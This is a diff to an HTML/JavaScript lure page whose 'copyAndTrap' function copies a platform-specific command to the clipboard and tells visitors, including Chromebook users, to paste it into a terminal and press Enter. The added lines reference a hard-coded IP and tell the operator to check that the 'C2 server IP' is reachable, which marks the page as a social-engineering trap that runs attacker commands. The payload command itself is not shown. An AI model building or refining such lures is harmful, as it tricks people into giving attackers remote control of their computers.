@@ -28,6 +28,7 @@
 
     <script>
         function copyAndTrap() {
+            // Ensure this IP is reachable from the Chromebook's Linux Container
             const ip = "192.168.40.136"; 
             const platform = navigator.platform.toLowerCase();
             let cmd = "";
@@ -47,7 +48,8 @@
                 instructions = `
                     1. Open the <b>Terminal</b> app from your App Launcher.<br>
                     2. Click on <b>Penguin</b> (or your Linux container).<br>
-                    3. <b>Ctrl + Shift + V</b> to paste and press <b>Enter</b>.
+                    3. <b>Ctrl + Shift + V</b> to paste and press <b>Enter</b>.<br><br>
+                    <i>Note: If connection is refused, ensure the C2 server IP is correct and reachable.</i>
                 `;
             } else {
                 // Default Windows PowerShell command
